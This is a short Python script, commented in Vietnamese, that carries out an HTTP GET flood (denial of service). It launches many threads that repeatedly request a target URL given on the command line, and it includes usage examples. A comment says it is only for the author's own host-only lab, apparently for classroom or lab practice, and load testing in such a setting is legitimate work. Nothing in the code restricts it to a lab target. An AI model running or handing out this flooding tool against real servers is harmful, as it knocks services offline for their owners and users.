#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
http_flood.py — Giả lập HTTP flood (DoS/DDoS) từ Windows vào web server trên Kali.

Cần: pip install requests
Chỉ dùng trong LAB host-only của chính bạn.

Ví dụ:
    python http_flood.py --target http://192.168.56.20 --threads 50
    python http_flood.py --target http://192.168.56.20 --path /index.html --seconds 30
"""
import argparse
import sys
import threading
import time

try:
    import requests
except ImportError:
    print("Cần cài: pip install requests")
    sys.exit(1)


def flood(target: str, path: str, stop: threading.Event, thread_id: int,
          timeout: float = 3.0):
    url = target.rstrip("/") + path
    session = requests.Session()
    count, errors = 0, 0
    while not stop.is_set():
        try:
            session.get(url, timeout=timeout)
            count += 1
        except Exception:
            errors += 1
            time.sleep(0.05)
        if count % 200 == 0 and count:
            print(f"    [thread {thread_id}] GET={count} lỗi={errors}")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="vd http://192.168.56.20")
    ap.add_argument("--path", default="/")
    ap.add_argument("--threads", type=int, default=50)
    ap.add_argument("--seconds", type=float, default=0, help="0 = chạy đến khi Ctrl+C")
    args = ap.parse_args()

    stop = threading.Event()
    threads = [threading.Thread(target=flood,
                                args=(args.target, args.path, stop, i), daemon=True)
               for i in range(max(1, args.threads))]
    print(f"[flood] HTTP GET {args.target}{args.path} bằng {args.threads} threads "
          f"({'Ctrl+C để dừng' if not args.seconds else f'{args.seconds}s'})")
    for t in threads:
        t.start()
    try:
        if args.seconds:
            time.sleep(args.seconds)
            stop.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop.set()
    print("[flood] Dừng.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
